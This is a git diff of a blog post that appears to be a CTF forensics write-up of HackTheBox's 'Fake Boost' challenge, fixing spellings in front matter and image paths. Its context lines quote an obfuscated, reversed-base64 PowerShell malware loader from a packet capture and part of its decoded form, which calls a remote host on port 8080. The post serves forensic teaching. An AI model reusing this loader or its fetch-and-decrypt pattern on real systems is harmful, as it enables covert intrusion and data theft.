@@ -2,11 +2,13 @@
 layout: post
 title: "forensics fakeboost"
 date: 2024-03-14 17:18:49 -0700
-description: This challenge involves analyzing a Wireshark capture to uncover a hidden flag. By examining TCP and UDP streams, decoding encoded scripts, and decrypting AES-encrypted data, we progressively reveal the flag.
+description: >-
+    This challenge involves analyzing a Wireshark capture to uncover a hidden flag. By examining TCP and UDP streams, decoding encoded scripts, and decrypting AES-encrypted data, we progressively reveal the flag.
 categories: ctfs
-parent: HackTheBox - Apocolypse '24
+parent: HackTheBox - Apocalypse '24
 grand_parent: CTF Events
-event: "hackthebox-apocolypse"
+event: "hackthebox-apocalypse"
+tags:
 - "forensics"
 - "Wireshark"
 - "TCP"
@@ -15,7 +17,8 @@ event: "hackthebox-apocolypse"
 - "reverse engineering"
 - "ctf"
 ---
-## Security Write-Up: Forensics Challenge - Fake Boost
+
+## Forensics - Fake Boost
 
 During the forensics challenge "Fake Boost," our goal was to unravel the mystery hidden within a Wireshark capture. The capture appeared to contain valuable information, potentially leading to the discovery of a hidden flag.
 
@@ -23,15 +26,15 @@ During the forensics challenge "Fake Boost," our goal was to unravel the mystery
 1. **Examining Traffic Flows:**
     - To kick things off, we dove into the traffic flows within the Wireshark capture. By analyzing the conversations and filtering for specific ports, we aimed to identify any suspicious activities or potential clues.
       - `Wireshark > Statistics > Capture`. These are the top two traffic results indicating some form of call/download, and they're also early in the stack implying these calls are the instantiation of whatever traffic we're looking for.
-    ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image.png)
+    ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image.png)
   
     - Our efforts quickly paid off as we spotted interesting web calls and URLs on Port 8080. These findings hinted at possible payloads or downloads lurking within the captured data.
       - This is what it looks like when we `right click > apply filter A<>B`
-        ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-1.png)
+        ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-1.png)
 
 1. **Extracting PowerShell Script from TCP Streams:**
     - With our curiosity piqued, we delved deeper into the TCP streams within the Wireshark capture. Using the "Follow TCP Stream" feature, we accessed raw data streams to uncover any hidden gems.
-    - ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-2.png)
+    - ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-2.png)
       ```powershell
       $jozeq3n = "9ByXkACd1BHd19ULlRXaydFI7BCdjVmai9ULoNWYFJ3bGBCfgMXeltGJK0gNxACa0dmblxUZk92YtASNgMXZk92Qm9kclJWb15WLgMXZk92QvJHdp5EZy92YzlGRlRXYyVmbldEI9Ayc5V2akoQDiozc5V2Sg8mc0lmTgQmcvN2cpREIhM3clN2Y1NlIgQ3cvhULlRXaydlCNoQD9tHIoNGdhNmCN0nCNEGdhREZlRHc5J3YuVGJgkHZvJULgMnclRWYlhGJgMnclRWYlhULgQ3cvBFIk9Ga0VWTtACTSVFJgkmcV1CIk9Ga0VWT0NXZS1SZr9mdulEIgACIK0QfgACIgoQDnAjL18SYsxWa69WTnASPgcCduV2ZB1iclNXVnACIgACIgACIK0wJulWYsB3L0<-------SNIP------->sHI0NWZqJ2Ttg2YhVkcvZEI8BSZjJ3bG1CIlNnc1NWZS1CIlxWaG1CIoRXYwRCIoRXYQ1CItVGdJRGbph2QtQXZHBCIgACIgACIK0wegknc0BCIgAiCNoQDpgCQg0DIz5WZr9GdkACIgAiCNoQDpACIgAiCNgGdhBHJddmbpJHdztFIgACIgACIgoQDoASbhJXYwBCIgAiCNsHIsFWZ0NFIu9Wa0Nmb1ZmCNoQDiEGZ3pWYrRmap9maxomczkDOxomcvADOwgjO1MTMuYTMx4CO2EjLykTMv8iOwRHdoJCI9ACTSVFJ" ;
       $s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2>&1> $null ;
@@ -43,7 +46,7 @@ During the forensics challenge "Fake Boost," our goal was to unravel the mystery
 2. **Decoding PowerShell Script:**
     - Armed with the encoded PowerShell script, our next step was to decode it and extract any valuable information concealed within. We turned to our trusty decoding tools to unravel the mystery.
       - The remainder of the PS script notes the following patterns: To array > Reverse > Join > Get String (into new variable) > From Base64. Let's throw that same string into cyber chef, doing the same thing, and see what we get.
-        - ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-3.png)
+        - ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-3.png)
         - ```powershell
           $URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"
 
@@ -295,16 +298,16 @@ During the forensics challenge "Fake Boost," our goal was to unravel the mystery
 4. **Final Steps:**
     - With most of the puzzle pieces in hand, we embarked on the final leg of our journey. Our task now was to decode any remaining encoded data and piece together the final components of the flag.
       - To generate the missing IV, we needed the first 16 bytes out of the encoded message from the `/rj1893rj1joijdkajwda` endpoint in the $URL parameter.
-        - ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-4.png)
-        - ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-5.png)
+        - ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-4.png)
+        - ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-5.png)
       - Then using that along with the AES_KEY, we can decrypt the message and get the final part of the flag.
         - ```sh
             $cat rj1893rj1joijdkajwda 
             bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==
             ```
     - With perseverance and a bit of ingenuity, we decoded the last bits of encoded data, revealing the final key required to complete the flag.
-      - ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-7.png)
-      - ![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-6.png)
+      - ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-7.png)
+      - ![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-forensics-fakeboost.md/2024-03-14-forensics-fakeboost/image-6.png)
 
 ### Conclusion:
 Through persistence and methodical analysis, we successfully uncovered the hidden flag concealed within the Wireshark capture. This challenge exemplifies the importance of thorough examination and the use of appropriate tools in forensic analysis, ultimately leading to the successful resolution of complex puzzles.
